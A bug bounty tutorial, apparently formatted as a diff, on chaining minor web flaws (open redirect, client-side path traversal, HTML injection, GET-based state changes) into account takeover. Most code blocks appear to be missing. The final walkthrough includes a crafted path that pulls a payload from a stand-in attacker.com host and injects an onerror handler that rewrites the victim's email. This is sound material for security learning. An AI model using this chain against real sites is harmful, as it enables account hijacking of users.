@@ -1,0 +1,188 @@
+Approaching a new target is always difficult because starting from scratch requires a lot of research and exploration, as well as a general sense of “where do I begin?” It’s a struggle for beginners and top hunters alike. If you’ve been in bug bounty for a while, you’re likely familiar with the feeling of being on a hardened target—a well-secured application with few flaws and is overall very intimidating. But here’s a secret: even the most secure apps often have tiny gadgets. Gadgets can be small misconfigurations or minor bugs that, by themselves, don’t create a lot of disruption for an application. In fact, you may only find an Informative or a P4 severity bug by looking at gadgets alone.
+
+In this case, how is it possible that hackers at live hacking events (LHEs) still find a lot of P1 and P2 vulnerabilities on programs that have been running for a long time? Because their methodologies are different; they gather little gadgets everywhere and save them for later.
+
+By staying patient and chaining small gadgets together, you can eventually uncover critical, high-impact bugs. In this article, we’ll talk about identifying these gadgets and combining them.
+
+How to find bugs?
+There are different ways to find a bug on a target. One way is to automate, conduct extensive reconnaissance, and spread payloads everywhere, similar to casting a wide net. This approach works, but you’d have to have top-notch automation, have the fastest setup, and be the first to the program. Conversely, the manual approach can be frustrating because it’s slower, it’s more involved, and most of the time, you do a lot of work to later find out that people have already found most of the bugs.
+
+The best way to find bugs is to know a target in and out. From there, you can determine whether automation or manual testing is the best approach. Take the time to learn each API, how the back end works, and how the dev works. Work to understand how new features are added, where to look, and where the meat is. But being this thorough takes a lot of time, even years. Another approach is navigating through an application and taking note of every quirk you can find (I cannot emphasize enough how important notetaking is). Even the smallest quirk or something out of place can eventually be useful when combined with something else.
+
+
+
+What are gadgets in bug bounty?
+In the context of hacking, gadgets are small, seemingly harmless vulnerabilities that can be powerful when combined. Think of them as the LEGO pieces of an exploit chain—one piece alone doesn’t do much, but put a few together and you can build something huge. In bug bounty, our gadgets are the little bugs, like an open redirect or a weird client-side quirk. Individually, they are low-severity bugs, but together, they can make a high-impact bug.
+
+ 
+
+
+
+Why are gadgets important?
+On hardened targets, you might not find a straightforward critical bug like a SQL injection or full RCE. Instead, you might discover a bunch of minor issues. An open redirect is typically rated as low severity on its own, but paired with a CSPT or single sign-on (SSO) misconfiguration, it can be devastating.
+
+Instead of directly reporting such minor issues, a skilled hunter will take note of each gadget, configuring them as puzzle pieces. Eventually, you will find something especially interesting, and as you refer back to your notes, you’ll realize you have enough to chain together a critical bug.
+
+Below, we’ll explore some common gadget vulnerabilities and how they work. Later, I will show you a full example of a nice chain of gadgets that are commonly found on most bug bounty programs. Keep in mind that this chaining approach requires a new mindset; it’s about seeing potential where others see low-hanging fruit. Be patient 😉
+
+Common gadget vulnerabilities
+Not every bug is a gadget. We’re specifically talking about low-impact bugs or quirks that are often ignored or downplayed on their own. In the following, I discuss some common gadgets.
+
+Open redirect
+Open redirect vulnerabilities allow an attacker to force an application to redirect users to an arbitrary external URL.
+
+You can usually find these in the UR. Look into some parameters like redirect=, next=, or returnUrl=. The app becomes a relay point that can send a victim to a malicious site. This is typically considered a low-severity bug, and many programs will mark such a finding as Informative. However, note them for later; they are powerful gadgets for chaining.
+
+Chain example using open redirect and XSS
+You can use an open redirect as an XSS. For instance, some apps might redirect by assigning window.location = returnUrl. If so, you can use the javascript: scheme and get an XSS. Here is an example:
+
+
+
+If an app redirects with the correct scheme, an alert will pop up. By doing this, your bug will have graduated from a P4 to a P1 or P2 (you still have to leverage the XSS to constitute a high-impact bug).
+
+Example chain using open redirect and bypass domain restrictions (CORS, CSP, etc.)
+Some exploits require loading content in the context of the target domain. Open redirect gadgets let you do exactly that. For example, a 2025 Grafana vulnerability was caused by an open redirect in a plugin installer. Attackers could force Grafana to fetch a plugin from its server because the app’s redirect endpoint forwarded to an external URL.
+
+With that, the external plugin containing malicious JavaScript ran inside Grafana as a trusted script, finishing with a stored XSS on the Grafana instance.
+
+This is a great example of chaining different little bugs and quirks together to create a critical bug. Here is the link to the full story: https://www.ionix.io/blog/grafana-cve-2025-4123-open-redirect-stored-xss-patch/
+
+Example chain using open redirect OAuth flow
+With an SSO bug on a website, there is usually a redirect component during the process of directing a user to the correct part of the website for the authentication of the code or token.
+
+If you’re able to manipulate and control this return URL, you can leak the user’s token or code and accomplish a full account takeover (ATO).
+
+Usually, if you check the return URL directly, it won’t work. Keeping this in mind, ask yourself, “Does the app only verify that the domain is the same as the website?” If that’s the case, you can chain that with another open redirect you found somewhere else. This way, you’re gaining a full chain leading to a full ATO on the user account.
+
+So, stop directly reporting open redirects when you find them. Keep and use them in a chain with other vulnerabilities. Practice patience 🙂
+
+Client-side path traversal (CSPT) gadget
+CSPT is a newer class of bug that’s been gaining attention. Essentially, a CSPT bug means the front-end JavaScript is taking some path input (like an ID or a file name) and sticking it into a URL without properly sanitizing path characters. If you put ../ or another type of traversal sequence in, the client-side script might fetch a resource it’s not supposed to or a legitimate resource in an unsafe way.
+
+What does CSPT look like? Here is an example of vulnerable code.
+
+
+
+So here, in the URL, you can use ../../ in the “id” parameter and use that to achieve a CSPT. Client-side code became an SSRF-like gadget, but for the client.
+
+Why is it a gadget? On its own, forcing a client to fetch a different path might not be impactful. If there’s nothing to fetch, this is not very useful, but combined with other gadgets, a CSPT can lead to a nice attack.
+
+For instance, with an open redirect, you can force a user to fetch a resource on your server, like a JSON you control, and make modifications to the user.
+
+Let’s consider a full example. You have a GET URL with an ID that will then be used to update a user profile. You found the CSPT on it, giving you the ability to modify the user profile.
+
+You then use an open redirect on the URL to perform a request to your server to modify the user profile with the information you want. It ends with just a single link to send the victim to change their whole profile. Pretty huge, right?
+
+
+
+As you can see, each bug on its own is weak, but the whole chain is strong and impactful.
+
+You can also use CSPT to bypass the front-end allowlist and fetch resources not intended to be fetched. Another good example is using the _method parameter to change a GET request to a POST request, leading to the ability to make modifications on the user side.
+
+Weak XSS vectors as gadgets
+Not all XSS attacks are equal. Sometimes, you’ll find an XSS that almost works. Maybe you can inject only HTML code and not script. Don’t report it as just an HTMLi. Yes, this is a P4, but chained with something else, you can create something bigger. With HTMLi, maybe you can achieve an mXSS and leverage it as an XSS, which is way better.
+
+If you find a self-XSS that is completely harmless, keep it in mind and take note. It may be useful when chained with other bugs like a CSRF or if you find another interesting quirk.
+
+Sometimes, you will also find a POST-based XSS, which is hard to exploit. Try chaining it with a CSRF. Or, again, take note and save it for later rather than settling for an Informative because by itself, the impact is low.
+
+Limited context for an XSS is common. Sometimes, all you can do is inject a style tag to change the color of a post. So, try doing some CSS injection, loading external CSS, and leaking a CSRF token that can then be used in another chain.
+
+There are so many possibilities everywhere; you just have to change your mindset and stop thinking in terms of bugs—think instead in terms of weird stuff.
+
+POST-to-GET conversion flaws
+This one is a bit abstract, but it’s when an HTTP GET request is able to trigger behavior that should require a POST request. Web apps use GET for safe operations, like fetching data and POST to change or modify data.
+
+With certain web servers, a web form must be submitted with a POST request but can also be submitted with a GET request if the back end is configured to do so. The $_REQUEST variable in PHP merges GET and POST, allowing either method.
+
+This way, you can use it to achieve a CSRF and modify the user profile, for example, using only a GET request.
+
+You can also combine that with a CSPT or an XSS.
+
+Interesting behaviors
+Even if there are ultimately no bugs on the asset you’re hunting, it’s important to take note of any interesting behaviors you come across. For example, if you can modify the email of your account without an app asking for any verification or your password, that’s considered an interesting behavior, not a bug. This can be leveraged later, when you find an XSS or a CSPT.
+
+A similar example is the password reset form on an app. Take a close look at it, how it works, and any issues. Even if there is no bug, take notes of any interesting behaviors that might be useful in the future.
+
+For my final two examples, I ask you to pay close attention to an application’s CSP configuration. Pay close attention to how it works and how it can be abused later when chained with another gadget. Additionally, explore the CORS policy. CORS may seem hardened at first, but noting its behavior can be useful in a future chain.
+
+Chaining gadgets for high impact
+We’ve covered a lot of different gadgets. Now, let’s talk about chaining them. The process is like solving a puzzle or building a machine: figure out how one piece’s output can be another piece’s input.
+
+Remember: when hacking on a tough target, take notes of every odd behavior. Don’t forget to also note the responses to requests, even if they’re just in the Repeater tab.
+
+For each gadget, ask, “What could I do with this?” What can I chain this with to have devastating impact? How can I make this gadget stronger? This thought process will inspire you to be creative and find new stuff.
+
+Create a proof of concept for each step. Lay out the entire chain and string it together in a way that will be easily understood by triagers and the platform team. Don’t forget: the most important part of bug hunting is showing impact. The final impact should be clear and easy to understand. Create a well-defined and succinct script that will help you and others launch an exploit.
+
+To close out this article, I will show you a full critical chain made with low-severity bugs.
+
+From open redirect + CSPT to full ATO
+Let’s walk through an example scenario to illustrate a gadget chain. Imagine you found some interesting pieces on a new program but they are considered P4 bugs.
+
+You have an open redirect.
+
+
+
+There is no validation, so you can use it to redirect any user to your website. By itself, it’s a low-severity bug; let’s not report it.
+
+You also found a CSPT in the user dashboard. There’s a feature where the dashboard loads user profile information from an API via JavaScript.
+
+The code calls GET /api/profile/<username> when you visit your dashboard. By tampering with the username value in local storage (or maybe in the URL hash), you find you can trick it into fetching other paths. For example, setting the username to ../public makes it request /api/profile/../public (which the server might interpret as /api/public).
+
+The response is an error for an unknown endpoint, but you confirm the front end isn’t validating it strictly.
+
+Neither bug is particularly dangerous alone. The open redirect is a classic P4. The CSPT doesn’t return anything useful (just errors) because you don’t know of any interesting files to fetch. But you notice something: the dashboard is only accessible to logged-in users (it’s a client-side single-page app). And it directly injects the API response into the page DOM (to display your profile info).
+
+What if you can make it fetch a profile you control and inject anything onto the page? Let’s build the full chain.
+
+
+
+The victim visits a URL you crafted that points to their dashboard, but with the gadgety payload. Consider the following example:
+
+
+
+(This is URL-encoded but decodes to ../util/redirect?url=https://attacker.com/payload.json as the profile path. We encoded it because it’s going into a URL fragment or parameter for the client script to use.)
+
+The client-side code in the dashboard will take that profile value and do the following:
+
+
+
+Thanks to the CSPT bug, this becomes a request to /api/util/redirect?url=https://attacker.com/payload.json(the ../ moved it up to the util directory).
+
+The server at /api/util/redirect is the open redirect gadget. It sees a URL parameter and responds with a redirect to https://attacker.com/payload.json.
+
+The victim’s browser follows the redirect (because fetch will follow it by default). Now the browser is requesting https://attacker.com/payload.json
+
+But (and this is crucial) it thinks this is still an example.com context fetch, so it will allow the response through because it was a same-origin call initially. Our server serves a JSON script that could look like the following:
+
+
+
+This JSON is the malicious payload. We also found another gadget: the profile update via GET (POST-to-GET flaw).
+
+You know the site has an endpoint /api/account/update?email=<new> (maybe from analyzing network calls or documentation).
+
+You include an <img> tag in the JSON that will trigger that update as soon as it’s inserted into the DOM.
+
+The client-side code receives the JSON from us and proceeds to render the profile. Maybe it does something naive like the following:
+
+
+
+It just took our name field and inserted it as HTML without sanitization. This is a common mistake. As a result, the <img onerror> from our JSON is now part of the DOM of example.com. The image src is broken (x), so it triggers the onerror event, which executes the JavaScript.
+
+
+
+Because the user is logged in, this request goes through and updates their email to our address.
+
+Now we own the user’s account (they can initiate a password reset to their own email). All the user did was click a link to their dashboard, but behind the scenes, the gadgets worked together to perform the malicious actions.
+
+We started with a simple open redirect and finished with a full ATO of the user—it’s definitely a P1 or P2 bug now.
+
+
+
+Conclusion: Gadgets rule them all
+Chaining gadgets is where hacking becomes an art. Hacking is not only about finding bugs and reporting them; it’s about being creative enough to chain little quirks to increase their impact. Finding these kinds of bugs makes it difficult to get a duplicate, but you still need to have each piece of the puzzle.
+
+In particular, noting gadgets is a useful mindset to adopt when facing hardened targets.
+
+I hope that now, you’ve learned patience. Go find more bugs and keep those open redirects instead of reporting them as P4 bugs 😉
